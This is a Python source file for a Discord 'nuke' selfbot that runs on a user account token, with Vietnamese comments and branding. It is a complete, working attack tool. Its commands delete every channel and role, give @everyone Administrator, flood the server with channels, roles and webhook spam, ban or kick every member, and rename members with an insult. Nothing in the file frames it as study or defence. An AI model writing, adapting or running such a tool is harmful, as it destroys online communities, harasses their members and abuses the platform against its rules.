import discord
from discord.ext import commands
import asyncio
from colorama import Fore

token = '' #Bỏ token account của bạn ở đây lưu ý là token account chứ không phải bot !
msg = '' #Message bạn muốn bot spam
channel_names = '' #Tên channel spam

intents = discord.Intents.all()
client = commands.Bot(command_prefix='.', intents=intents, self_bot=True)
client.remove_command('help')

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.offline)
    print(f'\n{Fore.BLUE} │{Fore.GREEN} Connected to {client.user}\n{Fore.BLUE} │ {Fore.GREEN} Guilds : {len(client.guilds)}\n{Fore.BLUE} │ {Fore.GREEN} Cached users : {len(client.users)}{Fore.RESET}')

@client.command()
async def bypass(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    async def rename_channel(channel):
        try:
            await channel.edit(name=channel_names)
            print(f"{Fore.GREEN}Renamed: {channel.name}{Fore.RESET}")
        except:
            print(f"{Fore.RED}Couldn't rename: {channel.name}{Fore.RESET}")

    async def spam_channel(channel):
        try:
            async def make_webhook_and_spam(_):
                webhook = await channel.create_webhook(name="RR")
                await asyncio.gather(*[webhook.send(msg) for _ in range(10)])
            await asyncio.gather(*[make_webhook_and_spam(i) for i in range(5)])
            print(f"{Fore.GREEN}Spammed: {channel.name}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Failed in {channel.name}: {e}{Fore.RESET}")

    await asyncio.gather(
        *[rename_channel(c) for c in guild.channels],
        *[spam_channel(c) for c in guild.text_channels]
    )
    await ctx.send("[+] Server Nuked")

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    async def create_and_spam(_):
        try:
            channel = await guild.create_text_channel(channel_names)
            async def make_webhook_and_spam(__):
                webhook = await channel.create_webhook(name="RR")
                await asyncio.gather(*[webhook.send(msg) for _ in range(10)])
            await asyncio.gather(*[make_webhook_and_spam(k) for k in range(5)])
            print(f"{Fore.GREEN}Created & spammed: {channel.name}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Failed: {e}{Fore.RESET}")

    await asyncio.gather(*[create_and_spam(i) for i in range(50)])
    await ctx.send("[+] Server Nuked")

@client.command()
async def ban(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    tasks = []
    
    for member in guild.members:
        if member != client.user and member != guild.owner:
            tasks.append(member.ban())
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success = sum(1 for r in results if not isinstance(r, Exception))
    await ctx.send(f"Banned {success} members.")

@client.command()
async def kick(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    tasks = []
    
    for member in guild.members:
        if member != client.user and member != guild.owner:
            tasks.append(member.kick())
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success = sum(1 for r in results if not isinstance(r, Exception))
    await ctx.send(f"Kicked {success} members.")

@client.command()
async def nukevip(ctx):
    try: await ctx.message.delete()
    except: pass
    guild = ctx.guild
    print(f"{Fore.MAGENTA}[NUKEVIP] Starting on: {guild.name}{Fore.RESET}")

    async def delete_channel(channel):
        try:
            await channel.delete()
            print(f"{Fore.GREEN}[✓] Deleted channel: {channel.name}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[✗] Channel delete failed: {e}{Fore.RESET}")

    await asyncio.gather(*[delete_channel(c) for c in guild.channels])

    try:
        await guild.edit(name="Bố Đức Vĩ Đại")
        print(f"{Fore.GREEN}[✓] Server renamed{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Rename server failed: {e}{Fore.RESET}")

    import random

    cursed_names = [
        "꧁༒𝕯𝖊𝖆𝖙𝖍༒꧂", "𝖙̷𝖍̷𝖊̷𝖛̷𝖔̷𝖎̷𝖉̷", "ᗪ乇ᗰ𝐎𝐍",
        "𝔇𝔞𝔯𝔨𝔩𝔬𝔯𝔡", "̸̛̛͚̥̺̙̲̾̀͒͒͘͟Ś̷̢̲̳̺̾̕͞K̢͈̱̮̦̔̓̀̚U̷͔͔͕̻̓͛̋͝L̨̢̟̦͓͛̒̔̚L̛̦̮͖̝̓̀̒͟",
        "꧁𝕭𝖑𝖔𝖔𝖉꧂", "𝖁𝖔𝖎𝖉𝕳𝖔𝖑𝖊", "༒𝓒𝓾𝓻𝓼𝓮𝓭༒",
        "ꈤꀎꀓꈼꀸ", "🆁🅸🅿", "𝕯𝖊𝖒𝖔𝖓𝕾𝖑𝖆𝖞𝖊𝖗",
        "ｄｅａｄｓｅｒｖｅｒ", "👁‍🗨WATCH", "⛧𝖀𝖓𝖍𝖔𝖑𝖞⛧",
        "💀nuked-by-nguyenduc💀", "̸̷̸̷̸̷̸̷̸̷̸̷̸̷̸",
        "ᵈᵉᵃᵈ ˢᵉʳᵛᵉʳ", "⚰️RIP⚰️", "𝖍𝖆𝖍𝖆𝖍𝖆𝖍𝖆",
        "🔴ALERT🔴", "𒀭𒅗𒈦𒄡", "꧁ψ𝓓𝓔𝓐𝓓ψ꧂",
    ]


    async def create_channel_and_spam(_):
        try:
            channel = await guild.create_text_channel("nuked-by-nguyenduc")
            print(f"{Fore.CYAN}[✓] Created channel: {channel.name}{Fore.RESET}")

            async def make_webhook(_):
                try:
                    name = random.choice(cursed_names)
                    wh = await channel.create_webhook(name=name)
                    await asyncio.gather(*[wh.send(msg) for _ in range(10)])
                except Exception as e:
                    print(f"{Fore.RED}[✗] Webhook failed: {e}{Fore.RESET}")

            await asyncio.gather(*[make_webhook(k) for k in range(3)])
        except Exception as e:
            print(f"{Fore.RED}[✗] Create channel failed: {e}{Fore.RESET}")

    async def create_spam_category(_):
        try:
            name = random.choice(cursed_names)
            await guild.create_category(name)
            print(f"{Fore.MAGENTA}[✓] Created category: {name}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[✗] Category failed: {e}{Fore.RESET}")

    async def create_spam_voice(_):
        try:
            name = random.choice(cursed_names)
            await guild.create_voice_channel(name)
            print(f"{Fore.YELLOW}[✓] Created voice: {name}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[✗] Voice failed: {e}{Fore.RESET}")

    await asyncio.gather(
        *[create_channel_and_spam(i) for i in range(50)],
        *[create_spam_category(i) for i in range(20)],
        *[create_spam_voice(i) for i in range(30)],
    )
    print(f"{Fore.CYAN}[✓] Channel/Category/Voice spam done{Fore.RESET}")

    async def delete_role(role):
        try:
            await role.delete()
            print(f"{Fore.GREEN}[✓] Deleted role: {role.name}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[✗] Role delete failed ({role.name}): {e}{Fore.RESET}")

    me = guild.me if guild.me else guild.get_member(client.user.id)
    top_pos = me.top_role.position if me else 0
    deletable_roles = [
        r for r in guild.roles
        if r.name != "@everyone" and r.position < top_pos
    ]
    await asyncio.gather(*[delete_role(r) for r in deletable_roles])

    try:
        everyone = guild.default_role
        await everyone.edit(permissions=discord.Permissions.all())
        print(f"{Fore.GREEN}[✓] @everyone granted Administrator{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Permission edit failed: {e}{Fore.RESET}")

    async def create_spam_role(_):
        try:
            await guild.create_role(name="nuked-by-nguyenduc")
            print(f"{Fore.CYAN}[✓] Created spam role{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[✗] Create role failed: {e}{Fore.RESET}")

    await asyncio.gather(*[create_spam_role(i) for i in range(100)])


    async def rename_member(member):
        try:
            if member == guild.owner or member.id == client.user.id:
                return
            await member.edit(nick="Óc chó bị nuke 🤣")
            print(f"{Fore.YELLOW}[✓] Renamed: {member.name}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[✗] Nick failed ({member.name}): {e}{Fore.RESET}")

    await asyncio.gather(*[rename_member(m) for m in guild.members])
    print(f"{Fore.YELLOW}[✓] All members renamed{Fore.RESET}")

    print(f"{Fore.MAGENTA}[NUKEVIP] Done!{Fore.RESET}")

@client.command()
async def help(ctx):
    try: await ctx.message.delete()
    except: pass

    embed = discord.Embed(title="NGUYENDUC NUKE SELFBOT", color=0xFF69B4)
    embed.add_field(name="Prefix", value=".", inline=False)
    embed.add_field(name="nuke", value="Starts nuking process", inline=False)
    embed.add_field(name="nukevip", value="Xoá channel, đổi tên server, xoá role, give @everyone full quyền", inline=False)
    embed.add_field(name="ban", value="Bans all members", inline=False)
    embed.add_field(name="kick", value="Kicks all members", inline=False)
    embed.add_field(name="bypass", value="Rename all channels and spams in them", inline=False)
    embed.set_footer(text="By NguyenDuc")

    await ctx.send(embed=embed)

client.run(token, bot=False)
